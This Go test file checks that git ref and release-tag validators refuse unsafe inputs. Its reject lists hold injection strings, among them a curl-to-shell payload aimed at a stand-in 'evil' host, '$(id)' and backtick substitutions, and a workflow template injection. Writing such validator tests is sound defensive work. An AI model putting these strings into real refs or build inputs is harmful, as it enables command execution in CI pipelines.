package model

import "testing"

func TestRunRefAlphabet(t *testing.T) {
	for _, value := range []string{"main", "feature/topic", "refs/heads/topic", "v1.2.3-rc.1+build", "topic@work=one,two", "Z_9./+@=,-"} {
		if err := ValidateRunRef(value); err != nil {
			t.Errorf("safe ref %q: %v", value, err)
		}
	}
	for _, value := range []string{"v9.9.9;curl${IFS}evil|sh", "refs/heads/topic{{workflow.parameters.x}}", "topic`id`", "topic$(id)", "topic'quote", "topic\"quote", "topic!", "topic#", "topic&", "topic<", "topic>", "topic space", "", "/topic", "-topic", "_topic", "topic\n"} {
		t.Run(value, func(t *testing.T) {
			if ValidateRunRef(value) == nil {
				t.Fatalf("unsafe ref accepted: %q", value)
			}
		})
	}
}

func TestReleaseVersionTagRejectsUnsafeSuffix(t *testing.T) {
	for _, tag := range []string{"v9.9.9;curl${IFS}evil|sh", "v9.9.9{{workflow.parameters.x}}", "v9.9.9`id`", "v9.9.9\n", "v9.9.9!", "v9.9.9 quoted"} {
		t.Run(tag, func(t *testing.T) {
			if IsReleaseVersionTag(tag) {
				t.Fatalf("unsafe suffix classified as release: %q", tag)
			}
		})
	}
	for _, tag := range []string{"v9.9.9", "v9.9.9-rc.1+meta", "v9.9.9@build=one,two", "v9.9.9/suffix"} {
		if !IsReleaseVersionTag(tag) {
			t.Errorf("safe release suffix refused: %q", tag)
		}
	}
}
